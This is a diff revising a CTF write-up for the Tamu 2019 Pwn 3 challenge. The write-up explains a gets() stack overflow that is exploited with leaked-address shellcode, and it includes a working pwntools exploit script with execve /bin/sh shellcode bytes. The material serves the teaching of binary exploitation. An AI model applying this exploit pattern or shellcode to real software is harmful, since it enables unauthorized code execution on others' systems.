@@ -1,51 +1,24 @@
 # Tamu 2019 Pwn 3
 
+This was done on `Ubuntu 20.04.4 LTS`.
+
 Let's take a look at the binary:
 
-```
-$	file pwn3 
-pwn3: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
-$	./pwn3 
-Take this, you might need it on your journey 0xffa1c61e!
-15935728
-```
+![pwn_checksec](pics/intro_data.png)
 
 So we are dealing with a 32 bit binary. When we run it, it prints out what looks like a stack address and prompts us for input. When we take a look at the main function in Ghidra, we see this:
 
-```
-/* WARNING: Type propagation algorithm not settling */
+![main](pics/main.png)
 
-undefined4 main(void)
-
-{
-  int iVar1;
-  
-  iVar1 = __x86.get_pc_thunk.ax(&stack0x00000004);
-  setvbuf((FILE *)(*(FILE **)(iVar1 + 0x19fd))->_flags,(char *)0x2,0,0);
-  echo();
-  return 0;
-}
-```
 
 Looking through the main function, the most important thing here is that it calls the `echo` function. Let's take a look at that function in Ghidra:
 
-```
-/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
+![echo](pics/echo.png)
 
-void echo(void)
-
-{
-  char input [294];
-  
-  printf("Take this, you might need it on your journey %p!\n",input);
-  gets(input);
-  return;
-}
-```
 
 So we can see that this function prints the address of the char buffer `input`, then calls `gets` with `input` as an argument. This is a bug since `gets` doesn't restrict how much data it scans in, we get an overflow. With this we can overwrite the return address and get code execution. The question is now what do we call? There aren't any functions that will either print the flag or give us a shell like in some of the previous challenges. We will instead be using shellcode.
 
-Shellcode is essentially just precompiled code that we can inject into a binary's memory, and if we redirect code execution to it it will run. It will need to match the architecture, so we will need to have arm for x86 linux. Whenever I need just generic shellcode I typically grab it from http://shell-storm.org/shellcode/ (or you could just google for shellcode, or make it yourself which we will cover later). I'll be using the `Linux/x86 - execve /bin/sh shellcode - 23 bytes` shellcode by `Hamza Megahed` found at `http://shell-storm.org/shellcode/files/shellcode-827.php`. The shellcode I'm using will just pop a shell for us when we run it.
+Shellcode is essentially just precompiled code that we can inject into a binary's memory, and if we redirect code execution to it it will run. It will need to match the architecture, in this case will be `Linux/x86`. Whenever I need just generic shellcode I typically grab it from http://shell-storm.org/shellcode/ (or you could just google for shellcode, or make it yourself which we will cover later). I'll be using the `Linux/x86 - execve /bin/sh shellcode - 23 bytes` shellcode by `Hamza Megahed` found at `http://shell-storm.org/shellcode/files/shellcode-827.php`. The shellcode I'm using will just pop a shell for us when we run it.
 
 Now we can inject it into memory, however we need to deal with something called ASLR (Address Space Layout Randomization). This is a binary mitigation (a mechanism made to make pwning harder). What it does is it randomizes all of the addresses for various memory regions, so every time the binary runs we don't know where things are in memory. While the addresses are random, the offsets between things in the same memory region remain the same. So if we just leak a single address from a memory region that we know what it is, since the offsets are the same we can figure out the address of anything else in the memory region.
 
@@ -143,10 +116,12 @@ Stack level 0, frame at 0xffffd070:
 
 Just a bit of math:
 
-```
->>> hex(0xffffd06c - 0xffffcf3e)
-'0x12e'
-```
+![python3_math](pics/python3_math.png)
+
+
+We can also see this offset via looking at the stack layout, and seeing that `input` is stored at offset `0x12e` (although I've noticed doing ghidra on occasion will get this wrong):
+
+![stack_layout](pics/stack_layout.png)
 
 So the space between the start of our input and the return address is `0x12e` bytes. This makes sense since the char array which holds our input is `294` bytes large, and there are two saved register values (ebx and ebp) on the stack in between our input and the saved return address each `4` bytes a piece (`294 + 4 + 4 = 0x12e`). With all of this, we have all we need to write the exploit:
 
@@ -156,21 +131,21 @@ from pwn import *
 target = process('./pwn3')
 
 # Print out the text, up to the address of the start of our input
-print target.recvuntil("journey ")
+print(target.recvuntil(b"journey "))
 
 # Scan in the rest of the line
 leak = target.recvline()
 
 # Strip away the characters not part of our address
-shellcodeAdr = int(leak.strip("!\n"), 16)
+shellcodeAdr = int(leak.strip(b"!\n"), 16)
 
 # Make the payload
-payload = ""
+payload = b""
 # Our shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
-payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 # Pad the rest of the space to the return address with zeroes
-payload += "0"*(0x12e - len(payload))
-# Overwrite the return address with te leaked address which points to the start of our shellcode
+payload += b"0"*(0x12e - len(payload))
+# Overwrite the return address with the leaked address which points to the start of our shellcode
 payload += p32(shellcodeAdr)
 
 # Send the payload
@@ -181,17 +156,7 @@ target.interactive()
 ```
 
 When we run it:
-```
-$	python exploit.py 
-[+] Starting local process './pwn3': pid 5149
-Take this, you might need it on your journey 
-[*] Switching to interactive mode
-$ w
- 19:33:06 up  2:19,  1 user,  load average: 0.01, 0.05, 0.07
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu tty7     :0               17:14    2:19m 40.15s  0.16s /sbin/upstart --user
-$ ls
-exploit.py  pwn3
-```
+
+![exploit_running](pics/exploit_running.png)
 
 Just like that, we popped a shell!
